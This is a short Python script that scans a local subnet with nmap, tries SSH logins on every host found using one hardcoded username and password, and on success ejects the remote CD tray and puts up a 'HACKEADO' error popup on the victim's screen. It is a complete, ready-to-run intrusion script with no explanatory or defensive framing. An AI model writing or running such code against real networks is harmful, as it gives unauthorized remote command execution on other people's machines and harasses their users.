#!/usr/bin/env python
# coding: utf-8
import paramiko
import socket
import os
import nmap


ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
nm = nmap.PortScanner()
nm.scan('192.168.0.0/24', '22-443')
hosts = []
for host in nm.all_hosts():
    hosts.append(host)

msg = '''zenity --error --text '<span foreground="red" font="96">HACKEADO</span>\n\n<i>Hey, Get it! ;)</i>' --display=:1'''

for devices in hosts:
    try:
        ssh.connect(devices, username='qwerty', password='init4289')
        ssh.exec_command('eject -r')
        ssh.exec_command(msg)
    except:
        continue
msg_2 = '''zenity --error --text '<span foreground="green" font="96">CONECTADO</span>\n\n<i>Hey, Get it! ;)</i>' '''
os.system(msg_2)
